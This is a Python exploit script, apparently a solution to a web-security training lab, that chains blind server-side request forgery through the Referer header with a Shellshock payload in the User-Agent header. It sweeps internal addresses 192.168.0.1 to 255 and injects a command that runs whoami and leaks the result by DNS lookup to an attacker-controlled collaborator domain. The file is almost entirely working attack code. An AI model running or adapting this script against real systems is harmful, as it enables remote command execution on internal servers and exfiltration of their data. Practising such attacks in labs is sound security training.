#!/bin/env /python3
import requests
import sys
import urllib3
import random
import threading
from urllib.parse import urlparse
from colorama import init

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://192.168.176.1:1082', 'https': 'http://192.168.176.1:1082'}

# chcke url if invalid
def chcke_url(url):
    req = requests.get(url, allow_redirects=False, verify=False, proxies=proxies)
    if(req.status_code == 504 or req.status_code != 200):
            print("\033[36m[-] Response: [Server Error: Gateway Timeout]")
            print("\033[1;31;40m[-] The lab url is invalid, please get it again.")
            sys.exit(-1)

def find_hostname(url, dnslog):
    product_path = '/product?productId=' + str(random.randint(1,20))
    for i in range(1,256):
        header_payload = {
            'Cookie': 'session=vXqYNAwqaChejiOBLxMIbPUdlnE8BIRc',
            'User-Agent': '() { :; }; /usr/bin/nslookup $(whoami).'+ str(i) +'.'+ dnslog,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://192.168.0.{0}:8080/'.format(i),
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        }

        req_list = requests.get(url + product_path, headers=header_payload, verify=False, proxies=proxies)

    print("\033[1;32;40m[+] Blind SSRF with Shellshock exploitation successful!")
    print("\033[1;32;40m[+] Go back to the Burp Collaborator client window poll now get result.")


def main():
    if len(sys.argv) != 3:
        print("\033[36m[+] Usage: {0} <url> <burp collaborator domain>".format(sys.argv[0]))
        print("\033[36m[+] Example: {0} https://www.bing.com xxx.oastify.com".format(sys.argv[0]))
        sys.exit(-1)

    o = urlparse(sys.argv[1])
    url = o.scheme + "://" + o.hostname
    dnslog = sys.argv[2]
	
    print("\033[36m[+] Finding admin hostname...")
    chcke_url(url)

    find_hostname(url, dnslog)


if __name__ == '__main__':
    main()